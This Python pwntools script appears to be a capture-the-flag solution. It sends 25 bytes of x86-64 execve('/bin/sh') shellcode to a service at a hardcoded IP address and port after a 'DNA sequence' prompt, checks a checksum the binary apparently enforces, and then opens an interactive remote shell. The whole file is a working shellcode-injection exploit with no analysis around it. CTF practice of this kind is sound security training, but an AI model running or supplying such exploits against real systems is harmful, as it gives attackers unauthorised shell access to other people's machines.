#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Standard x86-64 shellcode for execve("/bin/sh", NULL, NULL)
# Length: 25 bytes
shellcode = b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

def calculate_checksum(payload):
    """Calculates the checksum as seen in the binary."""
    checksum = 0
    for i, byte in enumerate(payload):
        checksum += (i + 1) * byte
    return checksum & 0xFF

def solve():
    """
    Connects to the server, sends the exploit payload, and provides an interactive shell.
    """
    # --- Verify our shellcode before sending ---
    checksum = calculate_checksum(shellcode)
    log.info(f"Shellcode length: {len(shellcode)} bytes")
    log.info(f"Calculated checksum: {checksum} (0x{checksum:02x})")

    if checksum == 255:
        log.error("Checksum is 255. Exploit will fail. Please modify the shellcode.")
        return
    else:
        log.success("Checksum is valid (not 255).")

    # --- Connection details ---
    HOST = "23.146.248.136"
    PORT = 10023
    
    # Establish connection
    conn = remote(HOST, PORT)
    
    # Wait for the prompt
    conn.recvuntil(b"Input your DNA sequence below:\n")
    log.info("Received prompt. Sending shellcode...")

    # --- Send the payload ---
    conn.send(shellcode)
    
    log.success("Payload sent! You should now have a shell.")
    
    # --- Enjoy the shell ---
    conn.interactive()

if __name__ == "__main__":
    solve()